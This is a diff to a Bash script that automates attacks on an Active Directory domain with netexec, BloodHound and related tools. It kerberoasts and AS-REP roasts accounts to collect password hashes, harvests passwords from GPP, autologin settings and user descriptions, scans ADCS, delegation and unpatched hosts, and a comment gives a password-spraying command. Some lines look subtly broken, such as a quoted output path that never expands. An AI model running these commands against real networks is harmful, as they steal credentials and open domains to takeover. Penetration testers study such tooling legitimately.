@@ -125,7 +125,9 @@ isAccountValid(){
 	USERNAME="$2"
 	PASSWORD="$3"
 	DOMAIN="$4"
-	printOrExecute "$SMBMAP -H \"$DCIP\" -u \"$USERNAME\" -p \"$PASSWORD\" -d \"$DOMAIN\" | grep \"Status: Authenticated\"" "$MODE"
+	#printOrExecute "$SMBMAP -H '$DCIP' -u '$USERNAME' -p '$PASSWORD' -d '$DOMAIN' | grep 'Status: Authenticated'" "$MODE"
+	# Let's do it now with netexec
+	printOrExecute "$NETEXEC smb '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' --threads 1 | grep '[+]'" "$MODE"
 	return $?
 }
 
@@ -294,19 +296,28 @@ fi
 # Create output directory
 if [ "$MODE" != "audit" ]; then
 	if [ -d "$OUTPUTDIR" ]; then
-		echo "Output directory $OUTPUTDIR already exists, please remove it or provide another one with -o option"
-		exit 1
+		echo "Output directory $OUTPUTDIR already exists, to you want to continue anyway ? [N/y]"
+		echo "Files will be overwritten"
+		read answer
+		if [ "$answer" != "y" ] && [ "$answer" != "Y" ]; then
+			echo "Exiting as requested"
+			exit 1
+		fi
+	else
+		logger "[*] Creating output directory $OUTPUTDIR"
+		mkdir "$OUTPUTDIR" || exit
 	fi
-	mkdir "$OUTPUTDIR" || exit
+	
 fi
 
+#TODO: -vv could reactivate the proxychains debug
 if [ "$SOCKS" == 1 ]; then
-	NETEXEC="proxychains $NETEXEC"
-	SMBMAP="proxychains $SMBMAP"
-	IMPACKETSCRIPTS="proxychains $IMPACKETSCRIPTS"
-	LDAPDOMAINDUMP="proxychains $LDAPDOMAINDUMP"
-	BLOODHOUND="proxychains $BLOODHOUND"
-	HOST="proxychains $HOST -T"
+	NETEXEC="proxychains -q $NETEXEC"
+	SMBMAP="proxychains -q $SMBMAP"
+	IMPACKETSCRIPTS="proxychains -q $IMPACKETSCRIPTS"
+	LDAPDOMAINDUMP="proxychains -q $LDAPDOMAINDUMP"
+	BLOODHOUND="proxychains -q $BLOODHOUND"
+	HOST="proxychains -q $HOST -T"
 	# Reduce threads in socks mode
 	# Too many threads will lead to timeouts and errors.
 	# Reduce if working through HTTP tunnel (sliver c2, etc.)
@@ -326,20 +337,20 @@ else
 	fi
 fi
 
-#List domain Controllers again
+# List domain Controllers again
 logger "
 [*] Identifying domain controllers in the domain $TARGETDOMAIN :"
-printOrExecute "$NETEXEC ldap $DCIP -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" --dc-list | tee \"$OUTPUTDIR/dclist.out\" | tee -a \"$LOGFILE\"" "$MODE"
-#printOrExecute "$HOST \"$TARGETDOMAIN\" | grep \"has address\" | cut -d ' ' -f 4 | tee \"$OUTPUTDIR/domainControllers.list\"" "$MODE"
+printOrExecute "$NETEXEC ldap $DCIP -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --dc-list --dns-tcp --dns-server $DCIP | tee -a '$OUTPUTDIR/nxc_dc-list.out' | tee -a '$LOGFILE'" "$MODE"
+#printOrExecute "$HOST '$TARGETDOMAIN' | grep 'has address' | cut -d ' ' -f 4 | tee '$OUTPUTDIR/domainControllers.list'" "$MODE"
 
-#Bloodhound Extract
+# Bloodhound Extract
 logger "
 [*] Fetching Bloodhound data from the AD:"
-printOrExecute "mkdir \"$OUTPUTDIR/bloodhound\" || exit" "$MODE"
-printOrExecute "cd \"$OUTPUTDIR/bloodhound\" || exit" "$MODE"
-printOrExecute "$BLOODHOUND -u \"$USERNAME@$DOMAIN\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -c All,LoggedOn --zip --dns-tcp -ns $DCIP | tee -a \"../../$LOGFILE\"" "$MODE"
+printOrExecute "mkdir '$OUTPUTDIR/bloodhound' || exit" "$MODE"
+printOrExecute "cd '$OUTPUTDIR/bloodhound' || exit" "$MODE"
+printOrExecute "$BLOODHOUND -u '$USERNAME@$DOMAIN' -p '$PASSWORD' -d '$TARGETDOMAIN' -c All,LoggedOn --zip --dns-tcp -ns $DCIP | tee -a '../../$LOGFILE'" "$MODE"
 #Alternative with netexec:
-#printOrExecute "$NETEXEC ldap $DCIP -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" --bloodhound -c All,LoggedOn --dns-tcp --dns-server $DCIP --threads $NETEXECTHREADS --zip | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/bloodhound-extract.out\"" "$MODE"
+#printOrExecute "$NETEXEC ldap $DCIP -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --bloodhound -c All,LoggedOn --dns-tcp --dns-server $DCIP --threads $NETEXECTHREADS --zip | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/bloodhound-extract.out'" "$MODE"
 printOrExecute "cd ../../ || exit" "$MODE"
 
 # AD Recon with ldapdomaindump
@@ -347,10 +358,14 @@ logger "
 [*] Fetching AD infos:"
 # Retired
 #"$GODDI" -username "$USERNAME" -password "$PASSWORD" -domain "$DOMAIN" -dc "$DOMAIN" -unsafe 2>&1 | tee -a "$LOGFILE"
-printOrExecute "$LDAPDOMAINDUMP --user \"$DOMAIN\\$USERNAME\" --password \"$PASSWORD\" \"$DCIP\" -o \"$OUTPUTDIR/ldapdomaindump\" | tee -a \"$LOGFILE\"" "$MODE"
-
-# Retired
-#printOrExecute "\"$IMPACKETSCRIPTS/GetADUsers.py\" -all \"$DOMAIN/$USERNAME:$PASSWORD\" -dc-ip \"$DCIP\" | tee -a \"$LOGFILE\" | tee \"$OUTPUTDIR/allUsersList.out\"" "$MODE"
+printOrExecute "$LDAPDOMAINDUMP --user '$DOMAIN\\$USERNAME' --password '$PASSWORD' '$DCIP' -o '$OUTPUTDIR/ldapdomaindump' | tee -a '$LOGFILE'" "$MODE"
+# Check success of the extract
+# Extract computer list
+logger "[*] Extracting domain computer list from ldapdomaindump"
+ADCOMPUTERFQDNS="$OUTPUTDIR/ldapdomaindump/domain_computers.fqdn"
+# Grep FQDNs only
+cut -f 3 "$OUTPUTDIR/ldapdomaindump/domain_computers.grep" | sort -u > "$ADCOMPUTERFQDNS"
+logger "[*] got $(wc -l < "$ADCOMPUTERFQDNS") computers in the domain list"
 
 # Kerberoasting
 # extract UserSPN TGS tickets
@@ -358,70 +373,107 @@ logger "
 [*] Now kerberoasting ...
 [*] Fetching User SPN TGSs:"
 # Retired GetUserSPNs.py
-#printOrExecute "$IMPACKETSCRIPTS/GetUserSPNs.py  -request \"$DOMAIN/$USERNAME:$PASSWORD\" -dc-ip \"$DCIP\" -target-domain \"$TARGETDOMAIN\" | tee -a \"$LOGFILE\" | tee \"$OUTPUTDIR/userSPNs.out\"" "$MODE"
-printOrExecute "$NETEXEC ldap \"$DCIP\" --kerberoasting \"$OUTPUTDIR/outuserSPNs.out\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" --threads $NETEXECTHREADS | tee -a \"$LOGFILE\"" "$MODE"
+#printOrExecute "$IMPACKETSCRIPTS/GetUserSPNs.py  -request '$DOMAIN/$USERNAME:$PASSWORD' -dc-ip '$DCIP' -target-domain '$TARGETDOMAIN' | tee -a '$LOGFILE' | tee '$OUTPUTDIR/userSPNs.out'" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --kerberoasting '$OUTPUTDIR/nxc_kerberoasting.out' --threads $NETEXECTHREADS | tee -a '$LOGFILE'" "$MODE"
 #extract TGTs without kerberos pre-auth
+
 logger "
 [*] Fetching TGTs of users without pre-auth:"
-printOrExecute "$IMPACKETSCRIPTS/GetNPUsers.py \"$DOMAIN/$USERNAME:$PASSWORD\" -request -dc-ip \"$DCIP\" -target-domain \"$TARGETDOMAIN\" | tee -a \"$LOGFILE\" | tee \"$OUTPUTDIR/preAuthUsers.out\"" "$MODE"
+# Retired GetNPUsers.py
+#printOrExecute "$IMPACKETSCRIPTS/GetNPUsers.py '$DOMAIN/$USERNAME:$PASSWORD' -request -dc-ip '$DCIP' -target-domain '$TARGETDOMAIN' | tee -a '$LOGFILE' | tee '$OUTPUTDIR/preAuthUsers.out'" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --asreproast '$OUTPUTDIR/nxc_asreproast.out' --threads $NETEXECTHREADS | tee -a '$LOGFILE'" "$MODE"
+
 
 # List ADCS servers
 logger "
 [*] Fetching ADCS servers:"
-printOrExecute "$NETEXEC ldap \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -M adcs --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/adcs.out\"" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M adcs --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_adcs.out'" "$MODE"
 # List SCCM config
 logger "
 [*] Fetching SCCM configs:"
-printOrExecute "$NETEXEC ldap \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -M adcs --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/sccm.out\"" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M sccm --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_sccm.out'" "$MODE"
 
 # More enum:
-#subnets
-#obsolete
-#-M get-desc-users (find passwords in user descriptions)
-#--active-users (contains user descriptions)
+# obsolete
+
+# --active-users (contains user descriptions)
+# nxc ldap $DCIP -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --active-users | tee nxc_active-users.out
+# cut -d ' ' -f 35 ./nxc_active-users.out | grep -v '[+]' | grep -v [*] | grep -v '-Username-' | sort -u > nxc_active-users.out.list
+# tr '[:upper:]' '[:lower:]' < nxc_active-users.out.list | sort -u > nxc_active-users.out.list2
+# suggest spray user as pass with this list
+# proxychains nxc smb 192.168.1.101 -u nxc_active-users.out.list2 -p nxc_active-users.out.list2 --no-bruteforce --continue-on-success
+
+# --pass-pol (password policy)
+# -M entra-id
+# Test if Active Directory Domain Services allows to create AD DNS records for low priv users
 
 #Get MachineAccountQuota attribute
 logger "
 [*] Getting MachineAccountQuota attribute..."
-printOrExecute "$NETEXEC ldap \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -M maq --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/maq.out\"" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M maq --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_maq.out'" "$MODE"
+
+# Extract subnets
+logger "
+[*] Extracting subnets ..."
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M get-network --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_subnets.out'" "$MODE"
+# Extract obsolete hosts
+logger "
+[*] Extracting obsolete hosts ..."
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M obsolete --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_obsolete.out'" "$MODE"
+
 
 # Integrate other ideas from
 #https://github.com/ahmadallobani/BaldHead/blob/main/commands/enum.py
 logger "
 [*] Enumerating delegation relationships..."
-printOrExecute "$NETEXEC ldap \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" --find-delegation --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/find-delegation.out\"" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --find-delegation --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_find-delegation.out'" "$MODE"
 logger "
 [*] Enumerating Users trusted for delegation..."
-printOrExecute "$NETEXEC ldap \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" --trusted-for-delegation --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/trusted-for-delegation.out\"" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --trusted-for-delegation --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_trusted-for-delegation.out'" "$MODE"
 logger "
 [*] Enumerating users with PASSWD_NOTREQD..."
-printOrExecute "$NETEXEC ldap \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" --password-not-required --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/password-not-required.out\"" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --password-not-required --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_password-not-required.out'" "$MODE"
 logger "
 [*] Identifying pre2k computers..."
-printOrExecute "$NETEXEC ldap \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -M pre2k --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/pre2k.out\"" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M pre2k --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_pre2k.out'" "$MODE"
 logger "
 [*] Enumerating GMSA accounts..."
-printOrExecute "$NETEXEC ldap \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" --gmsa --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/gmsa.out\"" "$MODE"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --gmsa --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_gmsa.out'" "$MODE"
 
 #Search for quick wins
 #First, dig for gpp passwords
 logger "
 [*] Looking for passwords in GPPs"
-printOrExecute "$NETEXEC smb \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -M gpp_password --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee \"$OUTPUTDIR/gppScan.out\"" "$MODE"
+printOrExecute "$NETEXEC smb '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M gpp_password --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_gppScan.out'" "$MODE"
 logger "
 [*] Looking for passwords in autologin"
-printOrExecute "$NETEXEC smb \"$DCIP\" -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -M gpp_autologin --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/gppScan.out\"" "$MODE"
+printOrExecute "$NETEXEC smb '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M gpp_autologin --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_gppScan.out'" "$MODE"
+logger "
+[*] Looking for passwords in descriptions"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M get-desc-users --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_get-desc-users.out'" "$MODE"
+logger "
+[*] Looking for vulns in ADCS configs"
+printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M certipy-find --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/nxc_certipy-find.out'" "$MODE"
+# Add full certipy scan
+# proxychains certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip $DCIP -json -text -enabled -output $OUTPUTDIR/certipy -dns-tcp -ns $DCIP
+
+logger "
+[*] Script executed successfully."
+
+logger "
+Now we suggest the following next steps (without socks proxy):
+autoNetRecon $ADCOMPUTERFQDNS
+then
+autoADrecon -u '$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -i autoNetRecon-output-dir/hostsSMB.list"
+
+
+logger "
+Also check for AD DNS write permissions with
+(not sure of this):
+krbrelayx/dnstool.py '$DOMAIN/$USERNAME:$PASSWORD@$DCIP' --dns-server $DCIP --check-write"
 
 exit 0
 
-
-# Extract computer list
-logger "
-[*] Leveraging domain computer list from ldapdomaindump"
-ADCOMPUTERFQDNS="$OUTPUTDIR/ldapdomaindump/domain_computers.fqdn"
-# Grep FQDNs only
-cut -f 3 "$OUTPUTDIR/ldapdomaindump/domain_computers.grep" | sort -u > "$ADCOMPUTERFQDNS"
-logger "[*] got $(wc -l < "$ADCOMPUTERFQDNS") computers in the domain list"
 
 # Scanning all hosts once
 ADCOMPUTERIPS="$OUTPUTDIR/ldapdomaindump/domain_computers.ips"
@@ -429,7 +481,7 @@ logger "
 [*] Scanning all discovered hosts to identify resolvable and reachable SMB hosts"
 # Resolve hosts
 logger "[*] Resolving hostnames to IPs"
-cat "$ADCOMPUTERFQDNS" | xargs -P 20 -I{} sh -c "$HOST -T {} $DCIP 2>/dev/null | grep \"has address\"" | tee \"$OUTPUTDIR/_resolved_hosts.list\"
+cat "$ADCOMPUTERFQDNS" | xargs -P 20 -I{} sh -c "$HOST -T {} $DCIP 2>/dev/null | grep 'has address'" | tee '$OUTPUTDIR/_resolved_hosts.list'
 cut -d ' ' -f 4 "$OUTPUTDIR/_resolved_hosts.list" > "$ADCOMPUTERIPS"
 rm "$OUTPUTDIR/_resolved_hosts.list"
 logger "[*] got $(wc -l < "$ADCOMPUTERIPS") resolved computers in the domain list"
@@ -439,7 +491,7 @@ logger "
 # Either use IPs or hostnames. IF using hostnames:
 # netexec smb _resolved_hosts.list --dns-tcp -t 10 --dns-server 10.8.27.102
 # But IPs will be faster
-printOrExecute "$NETEXEC smb \"$ADCOMPUTERIPS\" --threads $NETEXECTHREADS | tee \"$OUTPUTDIR/netexec-sweep.out\" | tee -a \"$LOGFILE\"" "$MODE"
+printOrExecute "$NETEXEC smb '$ADCOMPUTERIPS' --threads $NETEXECTHREADS | tee '$OUTPUTDIR/netexec-sweep.out' | tee -a '$LOGFILE'" "$MODE"
 
 # Combine with provided hostfile if any
 if [ "$HOSTFILE" == "" ]; then
@@ -455,7 +507,7 @@ cut -d ' '-f 1 $REACHABLEHOSTS > $REACHABLEHOSTS
 logger "
 [*] Looking for LDAP signing on domain controllers"
 #python3 "$LDAPSCANNER" "$DOMAIN/$USERNAME:$PASSWORD@" -target-file "$OUTPUTDIR/domainControllers.list" 2>&1 | tee -a "$LOGFILE"  | tee "$OUTPUTDIR/ldapSigningDCs.out"
-printOrExecute "$NETEXEC ldap \"$OUTPUTDIR/domainControllers.list\" -M ldap-checker -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee \"$OUTPUTDIR/ldapSigningDCs.out\"" "$MODE"
+printOrExecute "$NETEXEC ldap '$OUTPUTDIR/domainControllers.list' -M ldap-checker -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee '$OUTPUTDIR/ldapSigningDCs.out'" "$MODE"
 
 
 # Scan other hosts for vulns and misconfigurations
@@ -464,8 +516,8 @@ printOrExecute "$NETEXEC ldap \"$OUTPUTDIR/domainControllers.list\" -M ldap-chec
 logger "
 [*] Listing all accessible shares"
 # Retire smbmap
-#printOrExecute "$SMBMAP --host-file $REACHABLEHOSTS -u \"$USERNAME\" -p \"$PASSWORD\" -d \"$DOMAIN\" | tee -a \"$LOGFILE\"  | tee \"$OUTPUTDIR/smbmapAll.out\"" "$MODE"
-printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" --shares --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/shares.out\"" "$MODE"
+#printOrExecute "$SMBMAP --host-file $REACHABLEHOSTS -u '$USERNAME' -p '$PASSWORD' -d '$DOMAIN' | tee -a '$LOGFILE'  | tee '$OUTPUTDIR/smbmapAll.out'" "$MODE"
+printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --shares --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/shares.out'" "$MODE"
 
 #TODO: HOSTFILE is too large and inefficient in large networks. smbhosts file would be better here
 #"$SMBCRUNCHDIR/SMBHunt.pl" -i "$HOSTFILE" -o "$OUTPUTDIR/smbhunt.out" -a "$DOMAIN\\$USERNAME:$PASSWORD" | tee -a "$LOGFILE"
@@ -482,18 +534,18 @@ printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u \"$DOMAIN\\$USERNAME\" -p \"$PAS
 # Hosts with webdav
 logger "
 [*] Checking for active WebClient service:"
-printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -M webdav --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/webdav.out\"" "$MODE"
+printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M webdav --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/webdav.out'" "$MODE"
 
 # Hosts with webdav
 logger "
 [*] Checking for active spooler service:"
-printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -M spooler --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/spooler.out\"" "$MODE"
+printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M spooler --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/spooler.out'" "$MODE"
 
 #Find unpatched systems:
 logger "
 [*] Looking for unpatched systems ...
 Remove-Mic"
-printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u \"$DOMAIN\\$USERNAME\" -p \"$PASSWORD\" -d \"$TARGETDOMAIN\" -M remove-mic --threads $NETEXECTHREADS | tee -a \"$LOGFILE\" | tee -a \"$OUTPUTDIR/remove-mic.out\"" "$MODE"
+printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M remove-mic --threads $NETEXECTHREADS | tee -a '$LOGFILE' | tee -a '$OUTPUTDIR/remove-mic.out'" "$MODE"
 
 # Check for other vulnerabilities
 #zerologon
@@ -501,5 +553,6 @@ printOrExecute "$NETEXEC smb $REACHABLEHOSTS -u \"$DOMAIN\\$USERNAME\" -p \"$PAS
 #printnightmare
 #smbghost
 #nopac
+#ntlm_reflection
 
 exit 0
